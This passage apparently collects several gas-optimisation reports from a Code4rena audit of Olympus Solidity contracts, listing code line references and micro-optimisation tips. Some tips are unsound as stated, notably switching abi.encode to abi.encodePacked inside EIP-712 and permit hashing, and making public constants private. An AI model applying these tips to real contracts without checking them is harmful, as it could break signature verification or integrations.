2022-08-olympus/src/test/policies/BondCallback.t.sol::256 => int8(_quoteDecimals) -  2022-08-olympus/src/test/policies/BondCallback.t.sol::263 => uint8(  2022-08-olympus/src/test/policies/BondCallback.t.sol::264 => int8(36 + _quoteDecimals - _payoutDecimals) +  2022-08-olympus/src/test/policies/BondCallback.t.sol::274 => uint8(  2022-08-olympus/src/test/policies/BondCallback.t.sol::275 => int8(36 + _quoteDecimals - _payoutDecimals) +  2022-08-olympus/src/test/policies/BondCallback.t.sol::290 => uint32(50_000), // uint32 debtBuffer  2022-08-olympus/src/test/policies/BondCallback.t.sol::293 => uint32(24 hours), // uint32 depositInterval (duration)  2022-08-olympus/src/test/policies/BondCallback.t.sol::294 => scaleAdjustment // int8 scaleAdjustment  2022-08-olympus/src/test/policies/Operator.t.sol::33 => uint8 _decimals  2022-08-olympus/src/test/policies/Operator.t.sol::132 => uint32(2000), // cushionFactor  2022-08-olympus/src/test/policies/Operator.t.sol::133 => uint32(5 days), // duration  2022-08-olympus/src/test/policies/Operator.t.sol::134 => uint32(100_000), // debtBuffer  2022-08-olympus/src/test/policies/Operator.t.sol::135 => uint32(1 hours), // depositInterval  2022-08-olympus/src/test/policies/Operator.t.sol::136 => uint32(1000), // reserveFactor  2022-08-olympus/src/test/policies/Operator.t.sol::137 => uint32(1 hours), // regenWait  2022-08-olympus/src/test/policies/Operator.t.sol::138 => uint32(5), // regenThreshold  2022-08-olympus/src/test/policies/Operator.t.sol::139 => uint32(7) // regenObserve  2022-08-olympus/src/test/policies/Operator.t.sol::1519 => operator.setCushionParams(uint32(6 hours), uint32(50_000), uint32(4 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1529 => operator.setRegenParams(uint32(1 days), uint32(8), uint32(11));  2022-08-olympus/src/test/policies/Operator.t.sol::1671 => operator.setCushionFactor(uint32(1000));  2022-08-olympus/src/test/policies/Operator.t.sol::1677 => assertEq(newConfig.cushionFactor, uint32(1000));  2022-08-olympus/src/test/policies/Operator.t.sol::1690 => operator.setCushionFactor(uint32(99));  2022-08-olympus/src/test/policies/Operator.t.sol::1695 => operator.setCushionFactor(uint32(10001));  2022-08-olympus/src/test/policies/Operator.t.sol::1708 => operator.setCushionParams(uint32(24 hours), uint32(50_000), uint32(4 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1714 => assertEq(newConfig.cushionDuration, uint32(24 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1716 => assertEq(newConfig.cushionDebtBuffer, uint32(50_000));  2022-08-olympus/src/test/policies/Operator.t.sol::1718 => assertEq(newConfig.cushionDepositInterval, uint32(4 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1731 => operator.setCushionParams(uint32(1 days) - 1, uint32(100_000), uint32(1 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1736 => operator.setCushionParams(uint32(7 days) + 1, uint32(100_000), uint32(1 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1741 => operator.setCushionParams(uint32(1 days), uint32(100_000), uint32(2 days));  2022-08-olympus/src/test/policies/Operator.t.sol::1746 => operator.setCushionParams(uint32(2 days), uint32(99), uint32(2 hours));  2022-08-olympus/src/test/policies/Operator.t.sol::1759 => operator.setReserveFactor(uint32(500));  2022-08-olympus/src/test/policies/Operator.t.sol::1765 => assertEq(newConfig.reserveFactor, uint32(500));  2022-08-olympus/src/test/policies/Operator.t.sol::1778 => operator.setReserveFactor(uint32(99));  2022-08-olympus/src/test/policies/Operator.t.sol::1783 => operator.setReserveFactor(uint32(10001));  2022-08-olympus/src/test/policies/Operator.t.sol::1799 => operator.setRegenParams(uint32(1 hours) - 1, uint32(11), uint32(15));  2022-08-olympus/src/test/policies/Operator.t.sol::1804 => operator.setRegenParams(uint32(1 days), uint32(0), uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1809 => operator.setRegenParams(uint32(1 days), uint32(10), uint32(9));  2022-08-olympus/src/test/policies/Operator.t.sol::1813 => operator.setRegenParams(uint32(1 days), uint32(11), uint32(15));  2022-08-olympus/src/test/policies/Operator.t.sol::1921 => assertEq(status.high.count, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1922 => assertEq(status.high.nextObservation, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1924 => assertEq(status.low.count, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1925 => assertEq(status.low.nextObservation, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1939 => assertEq(status.high.count, uint32(1));  2022-08-olympus/src/test/policies/Operator.t.sol::1940 => assertEq(status.high.nextObservation, uint32(2));  2022-08-olympus/src/test/policies/Operator.t.sol::1942 => assertEq(status.low.count, uint32(1));  2022-08-olympus/src/test/policies/Operator.t.sol::1943 => assertEq(status.low.nextObservation, uint32(2));  2022-08-olympus/src/test/policies/Operator.t.sol::1970 => assertEq(status.high.count, uint32(1));  2022-08-olympus/src/test/policies/Operator.t.sol::1971 => assertEq(status.high.nextObservation, uint32(2));  2022-08-olympus/src/test/policies/Operator.t.sol::1972 => assertEq(status.low.count, uint32(1));  2022-08-olympus/src/test/policies/Operator.t.sol::1973 => assertEq(status.low.nextObservation, uint32(2));  2022-08-olympus/src/test/policies/Operator.t.sol::1986 => assertEq(status.high.count, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1987 => assertEq(status.high.nextObservation, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1989 => assertEq(status.low.count, uint32(0));  2022-08-olympus/src/test/policies/Operator.t.sol::1990 => assertEq(status.low.nextObservation, uint32(0));  2022-08-olympus/src/test/policies/PriceConfig.t.sol::69 => uint48(8 hours), // uint32 observationFrequency_,  2022-08-olympus/src/test/policies/PriceConfig.t.sol::70 => uint48(7 days) // uint32 movingAverageDuration_,  2022-08-olympus/src/test/policies/PriceConfig.t.sol::102 => function getObs(uint8 nonce) internal returns (uint256[] memory) {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::147 => function testCorrectness_initialize(uint8 nonce) public {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::177 => function testCorrectness_changeMovingAverageDuration(uint8 nonce) public {  2022-08-olympus/src/test/policies/PriceConfig.t.sol::201 => function testCorrectness_changeObservationFrequency(uint8 nonce) public { ```  ## 12. Use `abi.encodePacked()` instead of `abi.encode()` (41 instances)  `abi.encodePacked()` is more efficient than `abi.encode()`.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::398 => return keccak256(abi.encode(typeHash, nameHash, versionHash, chainID, address(this)));  2022-08-olympus/src/external/OlympusERC20.sol::861 => abi.encode(_PERMIT_TYPEHASH, owner, spender, value, _useNonce(owner), deadline)  2022-08-olympus/src/test/lib/larping.sol::18 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::26 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::34 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::43 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::51 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::59 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::68 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::76 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::84 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::93 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::101 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::109 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::118 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::126 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::134 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::143 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::151 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::159 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::168 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::176 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::184 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::193 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::201 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::209 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::218 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::226 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::234 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::243 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::251 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::259 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::268 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::276 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::284 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::293 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::301 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::309 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::318 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::326 => abi.encode(returned1)  2022-08-olympus/src/test/lib/larping.sol::334 => abi.encode(returned1) ```  ## 13. Use `private` instead of `public` for constants (17 instances)  If needed, the value can be read from the verified contract source code. Savings are due to the compiler not having to create non-payable getter functions for deployment calldata, and not adding another entry to the method ID table.  ```solidity 2022-08-olympus/src/modules/PRICE.sol::59 => uint8 public constant decimals = 18;  2022-08-olympus/src/modules/RANGE.sol::65 => uint256 public constant FACTOR_SCALE = 1e4;  2022-08-olympus/src/policies/Governance.sol::121 => uint256 public constant SUBMISSION_REQUIREMENT = 100;  2022-08-olympus/src/policies/Governance.sol::124 => uint256 public constant ACTIVATION_DEADLINE = 2 weeks;  2022-08-olympus/src/policies/Governance.sol::127 => uint256 public constant GRACE_PERIOD = 1 weeks;  2022-08-olympus/src/policies/Governance.sol::130 => uint256 public constant ENDORSEMENT_THRESHOLD = 20;  2022-08-olympus/src/policies/Governance.sol::133 => uint256 public constant EXECUTION_THRESHOLD = 33;  2022-08-olympus/src/policies/Governance.sol::137 => uint256 public constant EXECUTION_TIMELOCK = 3 days;  2022-08-olympus/src/policies/Operator.sol::89 => uint32 public constant FACTOR_SCALE = 1e4;  2022-08-olympus/src/scripts/Deploy.sol::75 => ERC20 public constant ohm = ERC20(0x0595328847AF962F951a4f8F8eE9A3Bf261e4f6b); // OHM goerli address  2022-08-olympus/src/scripts/Deploy.sol::76 => ERC20 public constant reserve = ERC20(0x41e38e70a36150D08A8c97aEC194321b5eB545A5); // DAI goerli address  2022-08-olympus/src/scripts/Deploy.sol::77 => ERC20 public constant rewardToken = ERC20(0x0Bb7509324cE409F7bbC4b701f932eAca9736AB7); // WETH goerli address  2022-08-olympus/src/scripts/Deploy.sol::80 => IBondAuctioneer public constant bondAuctioneer =  2022-08-olympus/src/scripts/Deploy.sol::82 => IBondAggregator public constant bondAggregator =  2022-08-olympus/src/scripts/Deploy.sol::86 => AggregatorV2V3Interface public constant ohmEthPriceFeed =  2022-08-olympus/src/scripts/Deploy.sol::88 => AggregatorV2V3Interface public constant reserveEthPriceFeed =  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::65 => uint48 public constant FEE_DECIMALS = 1e5; // one percent equals 1000. ```  ## 14. Don't compare boolean expressions to boolean literals (4 instances)  `if (<x> == true)` can be refactored to `if (<x>)`, `if (<x> == false)` can be refactored to `if (!<x>)`.  ```solidity 2022-08-olympus/src/policies/Governance.sol::223 => if (proposalHasBeenActivated[proposalId_] == true) {  2022-08-olympus/src/policies/Governance.sol::306 => if (tokenClaimsForProposal[proposalId_][msg.sender] == true) {  2022-08-olympus/src/policies/Operator.sol::351 => if (id_ == RANGE.market(true)) {  2022-08-olympus/src/policies/Operator.sol::355 => if (id_ == RANGE.market(false)) { ```  ## 15. Use custom errors instead of `revert()`/`require()` strings (24 instances)  Using `require()`/`revert()` strings is expensive. Starting from Solidity v0.8.4, there is a convenient and gas-efficient way to explain to users why an operation failed through the use of custom errors.  Custom errors decrease both deploy and runtime gas costs. Note that runtime gas cost is only relevant when the revert condition is met.  ```solidity 2022-08-olympus/src/external/OlympusERC20.sol::103 => revert("ECDSA: invalid signature");  2022-08-olympus/src/external/OlympusERC20.sol::105 => revert("ECDSA: invalid signature length");  2022-08-olympus/src/external/OlympusERC20.sol::107 => revert("ECDSA: invalid signature 's' value");  2022-08-olympus/src/external/OlympusERC20.sol::109 => revert("ECDSA: invalid signature 'v' value");  2022-08-olympus/src/external/OlympusERC20.sol::571 => require(c >= a, "SafeMath: addition overflow");  2022-08-olympus/src/external/OlympusERC20.sol::597 => require(c / a == b, "SafeMath: multiplication overflow");  2022-08-olympus/src/external/OlympusERC20.sol::769 => require(sender != address(0), "ERC20: transfer from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::770 => require(recipient != address(0), "ERC20: transfer to the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::780 => require(account != address(0), "ERC20: mint to the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::788 => require(account != address(0), "ERC20: burn from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::802 => require(owner != address(0), "ERC20: approve from the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::803 => require(spender != address(0), "ERC20: approve to the zero address");  2022-08-olympus/src/external/OlympusERC20.sol::858 => require(block.timestamp <= deadline, "ERC20Permit: expired deadline");  2022-08-olympus/src/external/OlympusERC20.sol::867 => require(signer == owner, "ERC20Permit: invalid signature");  2022-08-olympus/src/libraries/TransferHelper.sol::20 => require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");  2022-08-olympus/src/libraries/TransferHelper.sol::32 => require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");  2022-08-olympus/src/libraries/TransferHelper.sol::44 => require(success && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::57 => require(msg.sender == from || isApprovedForAll[from][msg.sender], "NOT_AUTHORIZED");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::82 => require(idsLength == amounts.length, "LENGTH_MISMATCH");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::84 => require(msg.sender == from || isApprovedForAll[from][msg.sender], "NOT_AUTHORIZED");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::128 => require(ownersLength == ids.length, "LENGTH_MISMATCH");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::188 => require(idsLength == amounts.length, "LENGTH_MISMATCH");  2022-08-olympus/src/test/lib/bonds/lib/ERC1155.sol::223 => require(idsLength == amounts.length, "LENGTH_MISMATCH");  2022-08-olympus/src/test/mocks/Faucet.sol::83 => require(success, "Withdraw Failed"); ```  ## 16. Use shift right/left instead of division/multiplication if possible (9 instances)  A division/multiplication by any number `x` being a power of 2 can be calculated by shifting `log2(x)` to the right/left. While the `DIV` opcode uses 5 gas, the `SHR` opcode only uses 3 gas. Furthermore, Solidity's division operation also includes a division-by-0 prevention which is bypassed using shifting.  ```solidity 2022-08-olympus/src/policies/Operator.sol::372 => int8 scaleAdjustment = int8(ohmDecimals) - int8(reserveDecimals) + (priceDecimals / 2);  2022-08-olympus/src/policies/Operator.sol::419 => uint256 invCushionPrice = 10**(oracleDecimals * 2) / range.cushion.low.price;  2022-08-olympus/src/policies/Operator.sol::420 => uint256 invWallPrice = 10**(oracleDecimals * 2) / range.wall.low.price;  2022-08-olympus/src/policies/Operator.sol::427 => int8 scaleAdjustment = int8(reserveDecimals) - int8(ohmDecimals) + (priceDecimals / 2);  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::253 => num1 = num1 - (146097 * num2 + 3) / 4;  2022-08-olympus/src/test/lib/bonds/bases/BondBaseTeller.sol::255 => num1 = num1 - (1461 * _year) / 4 + 31;  2022-08-olympus/src/test/policies/BondCallback.t.sol::271 => uint256 minimumPrice = (priceSignificand / 2) *  2022-08-olympus/src/test/policies/Operator.t.sol::869 => uint256 amountIn = auctioneer.maxAmountAccepted(id, guardian) / 2;  2022-08-olympus/src/test/policies/Operator.t.sol::900 => uint256 amountIn = auctioneer.maxAmountAccepted(id, guardian) / 2; ``` 
# INFORMATIONAL SEVERITY ISSUES  **Change Function Visibilities**  **Description:**  Some functions in the contract are designed with a public function without being called internally within the contract. These sets of function with the public visibility costs will cost more call during interaction. The function shares the same name across modules.   The functions are: KEYCODE VERSION  **Remediation:**  For gas optimization, it’s recommended to make these functions external since they were not directly used within the contract. 
1.-Post-increment / post-decrement cost more gas than pre-increment/pre-decrement. Modify the following statements: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L49 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L64 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L488 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L670 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L686   2.- <array>.length should not be looked up in every loop of a for-loop The overheads outlined below are PER LOOP, excluding the first loop. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L278   3.- Greater or equal/lower or equal cost more gas than greater/lower. Swich operators  <= / >= for < / > and change to increment / decrement the variable in consecuence: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L210 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L211 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L216 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L217 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L486 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L667 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L683  4.- Greater than 0 cost more than !=0. Change the following statements: https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L247  5.- Variable1 += (-=) variable2 cost more gas than variable1 = Variable1 + (-) Variable2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L96 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L97 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L115 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L116 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L131 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L132 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L136 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L138 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L222 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/VOTES.sol#L58 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L143 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L144 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Heart.sol#L103 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L194 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L198 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L252 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L254   6.- instead of using public for constats, use private. It saves gas. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L65 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L121 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L124 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L130 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L133 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L137   7.-Do not contrast boolean expressions with boolean literals https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L223 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Governance.sol#L306   8.- Use of uints/ints more modest than 32 Bytes (256 pieces) causes above https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/RANGE.sol#L45 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L44 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L47 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L50 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L56 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L59 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L84 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L87 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L127 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L161 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L185 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L83 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L86 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L89 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L371 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L375 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L418 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L426 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L430 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L485 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L665 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L13 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L14 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L15 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L16 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L17 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L18 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L19 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L20 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L31 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L32 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/interfaces/IOperator.sol#L33   9.- Present variables with default values are not required https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L397 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L43 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L58  Assuming than uint's less than 256 are updated to uint256. [Operator.sol#L127](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L127) [Operator.sol#L129](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L129) [Operator.sol#403](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L403) [Operator.sol#455](https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L455)   10.- Multiply/divide by two should use bit shift https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L372 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L419 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L420 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/Operator.sol#L427   11.- When you have a function parameter where you just need to read the data use calldate instead of memory. Can save gas. https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/PRICE.sol#L205 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/TreasuryCustodian.sol#L53 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/BondCallback.sol#L152 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/policies/PriceConfig.sol#L45   12.- Use a more recent version of solidity https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/Kernel.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/utils/KernelUtils.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/TRSRY.sol#L2 https://github.com/code-423n4/2022-08-olympus/blob/277535739c465c75d37c33d706ab76365df2aade/src/modules/MINTR.sol#L2 